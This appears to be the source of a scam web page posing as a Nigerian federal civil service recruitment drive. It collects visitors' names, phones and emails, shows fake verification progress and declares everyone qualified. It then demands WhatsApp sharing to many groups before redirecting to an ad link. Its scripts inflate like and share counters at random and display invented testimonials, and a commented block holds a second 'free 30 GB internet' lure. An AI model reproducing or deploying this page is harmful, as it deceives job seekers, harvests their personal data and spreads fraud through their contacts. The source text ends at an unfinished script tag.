+<p class="p1"><span class="Apple-converted-space">    </span>border: 0;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>outline: none;</p>
+<p class="p1">}</p>
+<p class="p1">.A{</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-align: center;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>background-color: rgb(4, 121, 14);</p>
+<p class="p1">}</p>
+<p class="p1">&lt;/style&gt;</p>
+<p class="p2"><span class="Apple-converted-space">  </span></p>
+<p class="p2"><span class="Apple-converted-space">  </span></p>
+<p class="p2"><span class="Apple-converted-space">  </span></p>
+<p class="p2"><span class="Apple-converted-space">  </span></p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;center&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8pdj5g9f6jmjpnCBMkcyzOEjZEC_h8MzTQc46DTDNUtynit0KgjASEuA_7WQcJjM8iE5ZAGGdaD3yfqIU_D1YovHHwrJW0ebOnZA8MdURCO2wi9QjcitO9_DIiDdapnT6BoMziyUd_Jp0s5WzwvLh_WtWTetpQyw5RES7ETs0TI5iXfaNCqoJwcU0VuRP/s1179/6fyter7yuchvjre.jpeg" alt="Free-Data" style="width: 100%;"&gt;</p>
+<p class="p2"><span class="Apple-converted-space">      </span></p>
+<p class="p1"><span class="Apple-converted-space">                     </span>&lt;/center&gt;</p>
+<p class="p2"><span class="Apple-tab-span">	</span></p>
+<p class="p2"><span class="Apple-converted-space">   </span></p>
+<p class="p1">&lt;!-- BEGIN: Powered by Supercounters.com --&gt;</p>
+<p class="p1">&lt;center&gt;&lt;script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;sc_online_t(1700765,"Users","ffffff");&lt;/script&gt;&lt;br&gt;&lt;noscript&gt;&lt;a href="https://www.supercounters.com/"&gt;supercounters.com&lt;/a&gt;&lt;/noscript&gt;</p>
+<p class="p1">&lt;/center&gt;</p>
+<p class="p1">&lt;!-- END: Powered by Supercounters.com --&gt;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><span class="Apple-converted-space">  </span></p>
+<p class="p1"><span class="Apple-converted-space">                        </span>&lt;div class="A"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>&lt;font color="white"&gt;CIVIL SERVICE COMMISSION EMPLOYMENT SCHEME 2024&lt;/font&gt;&lt;br/&gt;&lt;font color="yellow"&gt; Apply is ongoing.&lt;/font&gt;</p>
+<p class="p1"><span class="Apple-converted-space">         </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;div class="post" width="100%"&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div id="intro"&gt;</p>
+<p class="p2"><span class="Apple-converted-space">         </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;p class="welcome"&gt;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-tab-span">	</span>&lt;center&gt;&lt;b&gt;&lt;font color="#04790e"&gt;Enter your name&lt;/font&gt;&lt;/b&gt;&lt;/center&gt;</p>
+<p class="p2"><span class="Apple-converted-space">              </span></p>
+<p class="p2"><span class="Apple-converted-space">               </span></p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;center&gt;&lt;input type="char" placeholder="Name" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"&gt;&lt;/center&gt;&lt;br/&gt;</p>
+<p class="p2"><span class="Apple-converted-space">                 <span class="Apple-tab-span">	</span>    </span></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">              </span>&lt;center&gt;&lt;b&gt;&lt;font color="#04790e"&gt;Enter your phone number&lt;/font&gt;&lt;/b&gt;&lt;/center&gt;</p>
+<p class="p2"><span class="Apple-converted-space">              </span></p>
+<p class="p2"><span class="Apple-converted-space">               </span></p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;center&gt;&lt;input type="char" placeholder="Phone number" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"&gt;&lt;/center&gt;&lt;br/&gt;</p>
+<p class="p2"><span class="Apple-converted-space">                 </span></p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-tab-span">	</span><span class="Apple-tab-span">	</span><span class="Apple-converted-space">    </span>&lt;center&gt;&lt;b&gt;&lt;font color="#04790e"&gt;Enter Email address&lt;/font&gt;&lt;/b&gt;&lt;/center&gt;</p>
+<p class="p2"><span class="Apple-converted-space">              </span></p>
+<p class="p2"><span class="Apple-converted-space">               </span></p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;center&gt;&lt;input type="char" placeholder="@mail" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"&gt;&lt;/center&gt;&lt;br/&gt;</p>
+<p class="p2"><span class="Apple-converted-space">                 </span></p>
+<p class="p2"><span class="Apple-converted-space">              </span></p>
+<p class="p2"><span class="Apple-converted-space">               </span></p>
+<p class="p2"><span class="Apple-converted-space">          </span></p>
+<p class="p2"><span class="Apple-converted-space">               </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;button id="go"&gt;Continue➤&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div id="loader"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div&gt;&lt;font color="#04790e"&gt;Checking your information....&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="spin"&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div id="num"&gt;0%&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div id="info"&gt;</p>
+<p class="p2"><span class="Apple-converted-space">         </span></p>
+<p class="p2"><span class="Apple-converted-space">          </span></p>
+<p class="p1"><span class="Apple-converted-space">              </span>&lt;center&gt;</p>
+<p class="p1">&lt;center&gt;&lt;p class="title"&gt;&lt;font color="#04790e"&gt;CHOOSE YOUR GENDER&lt;/p&gt;&lt;/center&gt;</p>
+<p class="p1">&lt;select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 330px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>height: 56px;</p>
+<p class="p1">"&gt;</p>
+<p class="p1">&lt;option value="أختر نوع الشبكة" selected="1"&gt;---Select your gender---&lt;/option&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;option value="1"&gt;Male &lt;/option&gt;</p>
+<p class="p1">&lt;option value="2"&gt; Female&lt;/option&gt;</p>
+<p class="p1">&lt;/select&gt;</p>
+<p class="p1">&lt;/center&gt;&lt;br&gt;</p>
+<p class="p2"><span class="Apple-converted-space">          </span></p>
+<p class="p2"><span class="Apple-converted-space">                  </span></p>
+<p class="p1"><span class="Apple-converted-space">          </span>&lt;button id="confirm"&gt;Continue&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;p class="error"&gt;Sorry, your name is missing &lt;a href="https://civilservice.ng.insiteagency.info/fcscrecruitment"&gt; &lt;b&gt;&lt;font color="#14948F"&gt;ADD NAME&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div id="checking"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">          </span>&lt;p class="title"&gt;&lt;font color="#04790e"&gt;Processing, Please wait&lt;/font&gt;&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="barr"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="fill"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div id="fill"&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="percentage center"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span id="load"&gt;&lt;i class="fa fa-spinner fa-pulse"&gt;&lt;/i&gt;&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span id="check"&gt;&lt;i class="fa fa-check-circle"&gt;&lt;/i&gt;&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span id="percentage"&gt;&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div id="share"&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">          </span>&lt;p class="tip"&gt;&lt;font color="black"&gt; Congratulations &lt;/font&gt;&lt;span id="getname"&gt;&lt;/span&gt;,&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;p class="tip"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">              </span>&lt;font color="black"&gt;You are qualified to work with the Federal Civil Service Commission.&lt;/font&gt;&lt;span class="amount"&gt; &lt;font color="red"&gt;Proceed below to get your staff form.&lt;/font&gt;&lt;/span&gt;&lt;br&gt;</p>
+<p class="p1"><span class="Apple-converted-space">              </span>&lt;font color="black"&gt; How to proceed:&lt;/font&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/p&gt;&lt;br&gt;&lt;font color="black"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;p class="tip"&gt;1.Share with 5 groups or 15 friends on WhatsApp (click the “SHARE” icon below).&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;p class="tip"&gt;2. You will be automatically redirected to our “STAFF” page once the bar is filled.&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">          </span>&lt;/font&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;button id="whatsapp"&gt;SHARE&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="barr"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="fill"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div id="fill2"&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="percentage center"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span&gt;&lt;i class="fa fa-spinner fa-pulse"&gt;&lt;/i&gt;&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span id="percentage2"&gt;0%&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div id="claim"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;p class="done"&gt;&lt;i class="fa fa-check-circle fa-3x" aria-hidden="true"&gt;&lt;/i&gt;&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;p class="title"&gt; &lt;font color="black"&gt;Click “STAFF PAGE” to proceed to get your staff form.&lt;/font&gt; &lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">           </span>&lt;br/&gt;</p>
+<p class="p1"><span class="Apple-converted-space">          </span>&lt;a<span class="Apple-converted-space">  </span>onclick="window.open('https://ak.jeekomih.com/4/3156656')" href="https://ak.jeekomih.com/4/3156656" &gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"&gt;&lt;font color="#04790e"&gt;STAFF FORM&lt;/font&gt;&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;/a&gt;&lt;br/&gt;</p>
+<p class="p2"><span class="Apple-converted-space">          </span></p>
+<p class="p1"><span class="Apple-converted-space">       </span>&lt;a<span class="Apple-converted-space">  </span>onclick="window.open('https://ak.jeekomih.com/4/3156656')" href="https://ak.jeekomih.com/4/3156656" &gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"&gt;&lt;font color="#04790e"&gt;PRINT FORM&lt;/font&gt;&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;/a&gt;&lt;br/&gt;</p>
+<p class="p1"><span class="Apple-converted-space">             </span>&lt;br/&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;button id="offer"&gt;DOWNLOAD FORM&lt;/button&gt;&lt;br/&gt;</p>
+<p class="p2"><span class="Apple-converted-space">             </span></p>
+<p class="p2"><span class="Apple-converted-space">             </span></p>
+<p class="p2"><span class="Apple-converted-space">          </span></p>
+<p class="p2"><span class="Apple-converted-space">          </span></p>
+<p class="p1"><span class="Apple-converted-space">              </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="comments"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="counter"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="reactions"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;img class="like" src="https://i.imgur.com/g6cV61A.png" /&gt; &lt;img class="love" src="https://i.imgur.com/0UHB1f0.png" /&gt; &lt;img class="care" src="https://i.imgur.com/sSMYbTT.png" /&gt; &lt;span id="likes"&gt;134K&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;span id="comments"&gt;23K comments&lt;/span&gt; &lt;span class="dot"&gt;·&lt;/span&gt; &lt;span id="shares"&gt;12K shares&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="bar"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;span class="react"&gt;&lt;i class="fa fa-thumbs-o-up"&gt;&lt;/i&gt; &lt;a class="liked"&gt;Like&lt;/a&gt;&lt;/span&gt; &lt;span class="react"&gt;&lt;i class="fa fa-comment-o"&gt;&lt;/i&gt; Comment&lt;/span&gt; &lt;span class="react"&gt;&lt;i class="fa fa-share"&gt;&lt;/i&gt; Share&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="comment"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="comment"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;img src="https://i.imgur.com/xp1ER6K.jpg" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="single-container"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>&lt;span class="user"&gt; Emmanuel Job &lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>&lt;span class="text"&gt;<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">                       </span>Thank you so much.</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="buttons"&gt;&lt;span class="time t1"&gt;1m&lt;/span&gt; &lt;span class="dot"&gt;·&lt;/span&gt; &lt;span class="action liked"&gt;Like&lt;/span&gt; · &lt;span class="action"&gt;Reply&lt;/span&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="comment"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;img src="https://1.bp.blogspot.com/--d2BBdGugW8/XpdlXRvB-HI/AAAAAAAAAJ8/xcstaPQkWoszaizR_rkK2Nc5L7xN2o7WACLcBGAsYHQ/s1600/FB_IMG_15869726679037399.jpg" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="single-container"&gt;&lt;span class="user"&gt;Frank Joe&lt;/span&gt; &lt;span class="text"&gt; Thank you so much, this is very helpful to me.<span class="Apple-converted-space">  </span>&lt;/span&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="buttons"&gt;&lt;span class="time t2"&gt;2m&lt;/span&gt; &lt;span class="dot"&gt;·&lt;/span&gt; &lt;span class="action liked"&gt;Like&lt;/span&gt; · &lt;span class="action"&gt;Reply&lt;/span&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="comment reply"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;img src="https://1.bp.blogspot.com/-UQW1DxDR9Ko/XpdlghF8wJI/AAAAAAAAAKU/EXuIMhMGNeED6BwLWbxkGgtBe3HL0RTTACLcBGAsYHQ/s1600/FB_IMG_15869730921979436.jpg" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="single-container"&gt;&lt;span class="user"&gt;John Peter &lt;/span&gt; &lt;span class="text"&gt; I can't thank you enough. Thank you so much. &lt;/span&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="buttons"&gt;&lt;span class="time t1"&gt;1m&lt;/span&gt; &lt;span class="dot"&gt;·&lt;/span&gt; &lt;span class="action liked"&gt;Like&lt;/span&gt; · &lt;span class="action"&gt;Reply&lt;/span&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="comment"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="single-container"&gt;&lt;span class="user"&gt;Precious Madu&lt;/span&gt; &lt;span class="text"&gt;Thank you so much.&lt;/span&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="buttons"&gt;&lt;span class="time t3"&gt;4m&lt;/span&gt; &lt;span class="dot"&gt;·&lt;/span&gt; &lt;span class="action liked"&gt;Like&lt;/span&gt; · &lt;span class="action"&gt;Reply&lt;/span&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="input"&gt;&lt;input placeholder="Write a comment..." /&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;script src="https://code.jquery.com/jquery-latest.min.js"&gt;&lt;/script&gt;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1">&lt;script type="text/javascript"&gt;</p>
+<p class="p1">var time = 0;</p>
+<p class="p1">window.setInterval(function () {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>time = time + 1;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>$(".t1").html(time + 1 + "m");</p>
+<p class="p1"><span class="Apple-converted-space">    </span>$(".t2").html(time + 2 + "m");</p>
+<p class="p1"><span class="Apple-converted-space">    </span>$(".t3").html(time + 4 + "m");</p>
+<p class="p1">}, 6e4);</p>
+<p class="p1">var likes = 134,</p>
+<p class="p1"><span class="Apple-converted-space">    </span>comments = 23,</p>
+<p class="p1"><span class="Apple-converted-space">    </span>shares = 12;</p>
+<p class="p1">window.setInterval(function () {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>likes = likes + Math.floor(Math.random() * 3);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>comments = comments + Math.floor(Math.random() * 2);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>shares = shares + Math.floor(Math.random() * 2);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>$("#likes").html(likes + "K");</p>
+<p class="p1"><span class="Apple-converted-space">    </span>$("#comments").html(comments + "K comments");</p>
+<p class="p1"><span class="Apple-converted-space">    </span>$("#shares").html(shares + "K shares");</p>
+<p class="p1">}, 5e3);</p>
+<p class="p1">$(".liked").click(function () {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>if ($(this).hasClass("selected")) {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>$(this).removeClass("selected");</p>
+<p class="p1"><span class="Apple-converted-space">        </span>$(this).html("Like");</p>
+<p class="p1"><span class="Apple-converted-space">    </span>} else {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>$(this).addClass("selected");</p>
+<p class="p1"><span class="Apple-converted-space">        </span>$(this).html("Unlike");</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1">});</p>
+<p class="p1">&lt;/script&gt;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1">&lt;script type="text/javascript"&gt;</p>
+<p class="p2"><br></p>
+<p class="p1">$("#go").click(function () {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>$("#intro").fadeOut(0);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>$("#loader").fadeIn(1000);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>var i = 0;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>var interval = setInterval(function () {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>$("#num").text(i + "%");</p>
+<p class="p1"><span class="Apple-converted-space">        </span>i += 1;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>if (i &gt;= 100) {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>clearInterval(interval);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>$("#loader").fadeOut(0);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>$("#info").fadeIn(1000);</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}, 50);</p>
+<p class="p1">});</p>
+<p class="p1">$("#confirm").click(function () {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>if ($("#name").val().length &lt; 4)</p>
+<p class="p1"><span class="Apple-converted-space">    </span>{</p>
+<p class="p1"><span class="Apple-converted-space">        </span>$(".error").fadeIn(500);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>} else {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>$("#info").fadeOut(0);</p>
+<p class="p1"><span class="Apple-converted-space">        </span>$("#checking").fadeIn(1000);</p>
+<p class="p1"><span class="Apple-converted-space">        </span>var i = 0;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>var interval = setInterval(function () {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>i += 1;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>$("#percentage").text(i + "%");</p>
+<p class="p1"><span class="Apple-converted-space">            </span>$("#fill").css("width", i + "%");</p>
+<p class="p1"><span class="Apple-converted-space">            </span>if (i == 50) {</p>
+<p class="p1"><span class="Apple-converted-space">                </span>i = 49;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>setTimeout(function () {</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>i = 50;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>}, 1000);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>}</p>
+<p class="p1"><span class="Apple-converted-space">            </span>if (i &gt;= 100) {</p>
+<p class="p1"><span class="Apple-converted-space">                </span>clearInterval(interval);</p>
+<p class="p1"><span class="Apple-converted-space">                </span>$("#load").fadeOut(0);</p>
+<p class="p1"><span class="Apple-converted-space">                </span>$("#check").fadeIn(0);</p>
+<p class="p1"><span class="Apple-converted-space">                </span>setTimeout(function () {</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>$("#checking").fadeOut(0);</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>$("#share").fadeIn(1000);</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>$("#getname").html($("#name").val());</p>
+<p class="p1"><span class="Apple-converted-space">                </span>}, 500);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}, 50);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1">});</p>
+<p class="p1">$(document).click(function () {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>if ($("#name").is(":focus")) {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>$(".error").fadeOut(500);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1">});</p>
+<p class="p1">&lt;/script&gt;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1">&lt;!--</p>
+<p class="p1">"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",</p>
+<p class="p1">--&gt;</p>
+<p class="p1"><span class="Apple-converted-space">      </span>&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>var text1 = "*FEDERAL GOVERNMENT EMPLOYMENT.*%0A*CIVIL SERVICE COMMISSION EMPLOYMENT SCHEME 2024*%0A%0AThe Federal Government through the Civil Service Commission is pleased to inform the general public that there is an ungoing massive recruitment opening and any individual seeking employment opportunity should apply for the recruitment.%0A%0A*Application is currently ongoing.*%0A%0A_Apply Here_%0Ahttps://civilservice.ng.insiteagency.info/fcscrecruitment",</p>
+<p class="p1"><span class="Apple-converted-space">            </span>text2 = " an amount of ",</p>
+<p class="p1"><span class="Apple-converted-space">            </span>text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",</p>
+<p class="p1"><span class="Apple-converted-space">            </span>error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",</p>
+<p class="p1"><span class="Apple-converted-space">            </span>abcde = "https://ak.jeekomih.com/4/3156656",</p>
+<p class="p1"><span class="Apple-converted-space">            </span>saved = "",</p>
+<p class="p1"><span class="Apple-converted-space">            </span>share = "whatsapp://send?text=" + text1;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/script&gt;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1">&lt;script&gt;</p>
+<p class="p1">&lt;!-- code by OD --&gt;</p>
